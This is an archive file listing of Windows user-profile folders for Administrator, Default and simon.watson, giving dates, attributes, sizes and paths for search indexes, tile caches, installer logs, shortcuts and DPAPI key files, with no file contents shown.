Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/0.0.filtertrie.intermediate.txt 2025-02-16 11:10:47 ....A 25902 7874 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/0.0.filtertrie.intermediate.txt 2025-02-16 11:11:30 ....A 25902 7874 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/0.0.filtertrie.intermediate.txt 2025-02-16 11:11:01 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/0.1.filtertrie.intermediate.txt 2025-02-16 11:10:47 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/0.1.filtertrie.intermediate.txt 2025-02-16 11:11:30 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/0.1.filtertrie.intermediate.txt 2025-02-16 10:57:56 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/0.1.filtertrie.intermediate.txt 2025-02-16 11:11:29 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/0.1.filtertrie.intermediate.txt 2025-02-16 10:52:23 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/0.1.filtertrie.intermediate.txt 2025-02-16 11:11:01 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/0.2.filtertrie.intermediate.txt 2025-02-16 11:10:47 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/0.2.filtertrie.intermediate.txt 2025-02-16 11:11:30 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/0.2.filtertrie.intermediate.txt 2025-02-16 10:57:56 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/0.2.filtertrie.intermediate.txt 2025-02-16 11:11:29 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/0.2.filtertrie.intermediate.txt 2025-02-16 10:52:23 ....A 5 5 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/0.2.filtertrie.intermediate.txt 2025-02-16 11:11:01 ....A 34612 10994 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/Apps.ft 2025-02-16 11:10:47 ....A 34612 10994 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/Apps.ft 2025-02-16 11:11:30 ....A 34612 10994 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/Apps.ft 2025-02-16 11:11:01 ....A 1047580 719180 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{6eca1642-b3d7-4be3-80a7-3ed2d8020eaf}/Apps.index 2025-02-16 11:10:47 ....A 1047580 719180 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ce0f41bc-1e91-49e0-b03c-1d884f810842}/Apps.index 2025-02-16 11:11:30 ....A 1047580 719180 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{effa8414-bc5e-4b37-9bb2-488e334cafda}/Apps.index 2025-02-16 10:57:56 ....A 25856 7862 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/0.0.filtertrie.intermediate.txt 2025-02-16 10:57:56 ....A 34548 10967 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/Apps.ft 2025-02-16 11:17:16 ....A 26738688 272002 Administrator/AppData/Local/Microsoft/Windows/WebCache/WebCacheV01.dat 2019-07-16 17:11:36 ....A 444 400 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/apps.csg 2019-07-16 17:11:36 ....A 150 150 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/apps.schema 2025-02-16 10:57:56 ....A 1047200 718973 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Apps_{ff6f46fd-3c24-4369-b7e0-93c115343bc2}/Apps.index 2019-07-20 11:08:22 ....A 351728 111904 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/appsglobals.txt 2019-07-22 10:30:26 ....A 243494 79691 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/appssynonyms.txt 2019-07-16 17:11:36 ....A 454 404 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settings.csg 2019-07-16 17:11:36 ....A 162 162 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settings.schema 2019-07-16 17:11:58 ....A 1425902 433654 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/appsconversions.txt 2019-07-16 17:11:58 ....A 532750 164506 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settingsconversions.txt 2019-10-15 15:55:46 ....A 44499 16216 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settingsglobals.txt 2019-07-22 10:20:36 ....A 103717 26202 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Input_{e6203cc7-00e9-4c54-bb59-fd11614004f4}/settingssynonyms.txt 2025-02-16 11:11:29 ....A 223977 58644 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/0.0.filtertrie.intermediate.txt 2025-02-16 11:11:29 ....A 245611 92125 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/Settings.ft 2025-02-16 10:52:23 ....A 223522 58460 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/0.0.filtertrie.intermediate.txt 2025-02-16 10:52:23 ....A 245057 91896 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/Settings.ft 2025-02-16 11:11:29 ....A 1511895 639024 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{4b54d621-d387-4d8f-aab0-2a598448f98b}/Settings.index 2025-02-16 10:48:53 ....A 53651 3845 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841765330557646.txt 2025-02-16 10:48:55 ....A 54346 4055 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841765352441279.txt 2025-02-16 10:49:02 ....A 54346 4055 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841765422158682.txt 2025-02-16 10:57:56 ....A 54587 4132 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841770757745075.txt 2025-02-16 11:10:47 ....A 55696 4198 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841778459831441.txt 2025-02-16 11:11:00 ....A 56084 4312 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841778606779500.txt 2025-02-16 11:11:30 ....A 56084 4312 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/AppCache133841778906549359.txt 2025-02-16 10:52:23 ....A 1509704 638100 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/ConstraintIndex/Settings_{ca29f10f-66ec-4f93-874a-42f0228a3350}/Settings.index 2025-02-16 11:16:07 ....A 65536 10791 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/settings.dat 2025-02-16 10:48:52 ..HSA 45056 4788 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/Settings/settings.dat.LOG1 2025-02-16 11:11:29 ....A 700656 85070 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/LocalState/DeviceSearchCache/SettingsCache.txt 2025-02-16 11:12:53 ....A 8296 1986 Administrator/AppData/Local/Packages/Microsoft.Windows.Search_cw5n1h2txyewy/TempState/CortanaUnifiedTileModelCache.dat 2025-02-16 11:16:06 ....A 8192 935 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/settings.dat 2025-02-16 10:48:52 ..HSA 16384 1025 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/Settings/settings.dat.LOG1 2025-02-16 11:11:03 ....A 7898 1969 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/StartUnifiedTileModelCache.dat 2025-02-16 10:48:53 ....A 11240 949 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_100_3_PNGEncoded_Header.bin 2025-02-16 10:48:53 ....A 460800 19863 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_100_3_PNGEncoded_Data.bin 2025-02-16 10:52:22 ....A 11240 1017 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_125_3_PNGEncoded_Header.bin 2025-02-16 10:52:22 ....A 460800 28378 Administrator/AppData/Local/Packages/Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy/TempState/TileCache_125_3_PNGEncoded_Data.bin 2025-02-16 10:49:11 ....A 17491 2558 Administrator/AppData/Local/Temp/dd_vcredist_amd64_20250216024910.log 2025-02-16 10:49:11 ....A 126956 15318 Administrator/AppData/Local/Temp/dd_vcredist_amd64_20250216024910_000_vcRuntimeMinimum_x64.log 2025-02-16 10:49:11 ....A 133546 16033 Administrator/AppData/Local/Temp/dd_vcredist_amd64_20250216024910_001_vcRuntimeAdditional_x64.log 2025-02-16 10:49:10 ....A 16652 2476 Administrator/AppData/Local/Temp/dd_vcredist_x86_20250216024909.log 2025-02-16 10:49:10 ....A 127134 15292 Administrator/AppData/Local/Temp/dd_vcredist_x86_20250216024909_000_vcRuntimeMinimum_x86.log 2025-02-16 10:49:10 ....A 139418 16620 Administrator/AppData/Local/Temp/dd_vcredist_x86_20250216024909_001_vcRuntimeAdditional_x86.log 2025-02-16 11:22:32 ....A 3702 1176 Administrator/AppData/Local/Temp/Dis1FA5.tmp 2025-02-16 10:48:49 ....A 2551 998 Administrator/AppData/Local/Temp/msedge_installer.log 2025-02-16 10:52:00 ....A 231246 27309 Administrator/AppData/Local/Temp/vminst.log 2025-02-16 11:22:33 ....A 1738 833 Administrator/AppData/Local/Temp/WM0.xml 2025-02-16 11:22:33 ....A 1632 835 Administrator/AppData/Local/Temp/WM1.xml 2025-02-16 11:22:33 ....A 3170 865 Administrator/AppData/Local/Temp/WM2.xml 2025-02-16 10:52:00 ....A 3257808 237050 Administrator/AppData/Local/Temp/vmmsi.log_20250216_025200.log 2025-02-16 11:22:36 ....A 2940 902 Administrator/AppData/Local/Temp/WM4.xml 2025-02-16 11:22:36 ....A 1492 809 Administrator/AppData/Local/Temp/WM5.xml 2025-02-16 11:22:36 ....A 3130 829 Administrator/AppData/Local/Temp/WM6.xml 2025-02-16 11:22:36 ....A 4782 1271 Administrator/AppData/Local/Temp/WM7.xml 2025-02-16 11:22:36 ....A 1484 813 Administrator/AppData/Local/Temp/WM8.xml 2025-02-16 10:48:48 ....A 693 458 Administrator/AppData/Local/Temp/wmsetup.log 2025-02-16 10:52:05 ...SA 313 313 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/26C212D9399727259664BDFCA073966E_F9F7D6A7ECE73106D2A8C63168CDA10D 2025-02-16 10:49:06 ...SA 471 471 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/698460A0B6E60F2F602361424D832905_8BB23D43DE574E82F2BEE0DF0EC47EEB 2025-02-16 10:49:13 ...SA 71954 71954 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/77EC63BDA74BD0D0E0426DC8F8008506 2025-02-16 10:48:49 ...SA 1858 1858 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/7EF516642261549A23D49DB36FFE5F3F_06DC937B2B8DD7A8D6D85B5D745374B6 2025-02-16 10:49:06 ...SA 727 727 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/8EC9B1D0ABBD7F98B401D425828828CE_264D47D6D8C34D077DC5D354913A7951 2025-02-16 10:49:06 ...SA 727 727 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/C8E534EE129F27D55460CE17FD628216_1130D9B25898B0DB0D4F04DC5B93F141 2025-02-16 10:48:49 ...SA 471 471 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_0FB9553B978E7F00C6B2309507DEB64A 2025-02-16 10:48:49 ...SA 471 471 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_363582827213C09529A76F35FB615187 2025-02-16 10:49:13 ...SA 1428 1428 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/F2E248BEDDBB2D85122423C41028BFD4 2025-02-16 10:50:07 ...SA 7796 7796 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/Content/FB0D848F74F70BB2EAA93746D24D9749 2025-02-16 10:53:11 ...SA 400 400 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/26C212D9399727259664BDFCA073966E_F9F7D6A7ECE73106D2A8C63168CDA10D 2025-02-16 10:49:06 ...SA 302 302 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/57C8EDB95DF3F0AD4EE2DC2B8CFD4157 2025-02-16 10:50:06 ...SA 400 400 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/698460A0B6E60F2F602361424D832905_8BB23D43DE574E82F2BEE0DF0EC47EEB 2025-02-16 10:52:05 ...SA 328 328 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/77EC63BDA74BD0D0E0426DC8F8008506 2025-02-16 10:50:06 ...SA 564 544 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/7EF516642261549A23D49DB36FFE5F3F_06DC937B2B8DD7A8D6D85B5D745374B6 2025-02-16 10:50:06 ...SA 404 404 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/8EC9B1D0ABBD7F98B401D425828828CE_264D47D6D8C34D077DC5D354913A7951 2025-02-16 10:50:06 ...SA 412 412 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/C8E534EE129F27D55460CE17FD628216_1130D9B25898B0DB0D4F04DC5B93F141 2025-02-16 10:50:06 ...SA 412 412 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_0FB9553B978E7F00C6B2309507DEB64A 2025-02-16 10:50:06 ...SA 412 412 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/E2C6CBAF0AF08CF203BA74BF0D0AB6D5_363582827213C09529A76F35FB615187 2025-02-16 10:49:13 ...SA 254 254 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/F2E248BEDDBB2D85122423C41028BFD4 2025-02-16 10:52:05 ...SA 330 330 Administrator/AppData/LocalLow/Microsoft/CryptnetUrlCache/MetaData/FB0D848F74F70BB2EAA93746D24D9749 2025-02-16 10:48:47 ...SA 960 960 Administrator/AppData/Roaming/Microsoft/Crypto/Keys/de7cf8a7901d2ad13e5c67c29e5d1662_4306fbaf-6469-426f-9f9e-c1c30342a3f9 2021-05-08 08:15:33 ....A 1259 512 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Control Panel.lnk 2021-05-08 08:15:33 ....A 1259 512 Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Control Panel.lnk 2021-05-08 08:15:33 ....A 1259 512 simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Control Panel.lnk 2021-05-08 08:18:35 ..HSA 270 270 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini 2021-05-08 08:18:35 ..HSA 270 270 Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini 2021-05-08 08:18:35 ..HSA 270 270 simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/desktop.ini 2025-02-16 10:48:49 ....A 2332 964 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Microsoft Edge.lnk 2021-05-08 08:15:33 ....A 1158 444 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk 2021-05-08 08:15:33 ....A 1158 444 Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk 2021-05-08 08:15:33 ....A 1158 444 simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Server Manager.lnk 2021-05-08 08:14:58 ....A 352 352 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk 2021-05-08 08:14:58 ....A 352 352 Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk 2021-05-08 08:14:58 ....A 352 352 simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Shows Desktop.lnk 2021-05-08 08:14:58 ....A 334 334 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk 2021-05-08 08:14:58 ....A 334 334 Default/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk 2021-05-08 08:14:58 ....A 334 334 simon.watson/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/Window Switcher.lnk 2025-02-16 10:48:53 ..HS. 83 83 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/desktop.ini 2021-05-08 08:14:58 ....A 407 407 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/File Explorer.lnk 2021-05-08 08:14:58 ....A 407 407 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk 2021-05-08 08:14:58 ....A 407 407 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk 2021-05-08 08:14:58 ....A 407 407 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/System Tools/File Explorer.lnk 2025-02-16 10:48:11 ....A 2398 998 Administrator/AppData/Roaming/Microsoft/Internet Explorer/Quick Launch/User Pinned/TaskBar/Microsoft Edge.lnk 2025-02-16 10:48:47 ..HSA 24 24 Administrator/AppData/Roaming/Microsoft/Protect/CREDHIST 2025-02-16 10:48:47 ..HSA 468 468 Administrator/AppData/Roaming/Microsoft/Protect/S-1-5-21-1498285545-150618015-1395900109-500/7db75135-c076-465e-a4cc-3d5243f57db7 2025-02-16 10:48:47 ..HSA 24 24 Administrator/AppData/Roaming/Microsoft/Protect/S-1-5-21-1498285545-150618015-1395900109-500/Preferred 2025-02-16 10:48:49 ..HS. 196 196 Administrator/AppData/Roaming/Microsoft/Windows/AccountPictures/desktop.ini 2025-02-16 10:48:49 ..HS. 302 302 Administrator/AppData/Roaming/Microsoft/Windows/Libraries/desktop.ini 2025-02-16 10:48:48 ....A 2125 1348 Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Documents.library-ms 2025-02-16 10:48:49 ....A 2082 1312 Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Music.library-ms 2025-02-16 10:48:48 ....A 2100 1309 Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Pictures.library-ms 2025-02-16 10:48:48 ....A 2110 1336 Administrator/AppData/Roaming/Microsoft/Windows/Libraries/Videos.library-ms 2025-02-16 11:10:58 ....A 104 104 Administrator/AppData/Roaming/Microsoft/Windows/Recent/All Tasks.lnk 2025-02-16 11:18:05 ....A 1702 948 Administrator/AppData/Roaming/Microsoft/Windows/Recent/ConsoleHost_history.txt.lnk 2025-02-16 10:48:48 ..HS. 432 432 Administrator/AppData/Roaming/Microsoft/Windows/Recent/desktop.ini 2025-02-16 11:18:05 ....A 1350 854 Administrator/AppData/Roaming/Microsoft/Windows/Recent/PSReadLine.lnk 2025-02-16 11:22:36 ....A 5183218 536073 Administrator/AppData/Local/Temp/WM3.xml 2025-02-16 11:10:45 ....A 116 116 Administrator/AppData/Roaming/Microsoft/Windows/Recent/System and Security.lnk 2025-02-16 11:10:45 ....A 146 146 Administrator/AppData/Roaming/Microsoft/Windows/Recent/System.lnk 2025-02-16 11:10:58 ....A 476 476 Administrator/AppData/Roaming/Microsoft/Windows/Recent/View network status and tasks.lnk 2025-02-16 11:18:05 ....A 4096 1222 Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/5f7b5f1e01b83767.automaticDestinations-ms 2025-02-16 11:10:58 ....A 4096 1053 Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/7e4dca80246863e3.automaticDestinations-ms 2025-02-16 11:18:05 ....A 4096 1238 Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/9b9cdc69c1c24e2b.automaticDestinations-ms 2025-02-16 10:48:50 ....A 24 24 Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/7e4dca80246863e3.customDestinations-ms 2025-02-16 11:18:05 ....A 7168 1913 Administrator/AppData/Roaming/Microsoft/Windows/Recent/AutomaticDestinations/f01b4d95cf55d32a.automaticDestinations-ms 2025-02-16 10:48:53 ....A 24 24 Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/f01b4d95cf55d32a.customDestinations-ms 2025-02-16 11:10:46 ....A 24 24 Administrator/AppData/Roaming/Microsoft/Windows/Recent/CustomDestinations/f18460fded109990.customDestinations-ms 2025-02-16 10:48:53 ....A 1045 729 Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Bluetooth File Transfer.LNK 2021-05-08 08:18:31 ....A 3 3 Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget 2021-05-08 08:18:31 ....A 3 3 Default/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget 2021-05-08 08:18:31 ....A 3 3 simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Compressed (zipped) Folder.ZFSendToTarget 2021-05-08 08:18:31 ....A 7 7 Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink 2021-05-08 08:18:31 ....A 7 7 Default/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink 2021-05-08 08:18:31 ....A 7 7 simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Desktop (create shortcut).DeskLink 2025-02-16 10:48:53 ..HS. 576 507 Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Desktop.ini 2021-05-08 08:18:31 ....A 4 4 Administrator/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail 2021-05-08 08:18:31 ....A 4 4 Default/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail 2021-05-08 08:18:31 ....A 4 4 simon.watson/AppData/Roaming/Microsoft/Windows/SendTo/Mail Recipient.MAPIMail 2025-02-16 11:18:27 ....A 355 355 Administrator/AppData/Roaming/Microsoft/Windows/ServerManager/ServerList.xml 2025-02-16 10:48:48 ..HS. 174 174 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/desktop.ini 2025-02-16 10:48:48 ..HS. 174 174 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/desktop.ini 2022-03-03 03:57:47 ..HSA 568 406 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/desktop.ini 2021-05-08 08:14:19 ....A 1106 415 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Magnify.lnk 2021-05-08 08:14:19 ....A 1106 415 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Magnify.lnk 2021-05-08 08:14:19 ....A 1106 415 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Magnify.lnk 2021-05-08 08:14:19 ....A 1108 419 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Narrator.lnk 2021-05-08 08:14:19 ....A 1108 419 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Narrator.lnk 2021-05-08 08:14:19 ....A 1108 419 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/Narrator.lnk 2021-05-08 08:14:19 ....A 1106 421 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/On-Screen Keyboard.lnk 2021-05-08 08:14:19 ....A 1106 421 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/On-Screen Keyboard.lnk 2021-05-08 08:14:19 ....A 1106 421 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessibility/On-Screen Keyboard.lnk 2025-02-16 10:48:48 ..HS. 334 334 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Desktop.ini 2025-02-16 10:48:48 ....A 1336 913 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Accessories/Internet Explorer.lnk 2025-02-16 10:48:49 ..HS. 174 174 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Administrative Tools/desktop.ini 2021-05-08 08:18:31 ..HSA 170 170 Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini 2021-05-08 08:18:31 ..HSA 170 170 Default/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini 2021-05-08 08:18:31 ..HSA 170 170 simon.watson/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Maintenance/Desktop.ini 2025-02-16 10:48:49 ..HS. 174 174 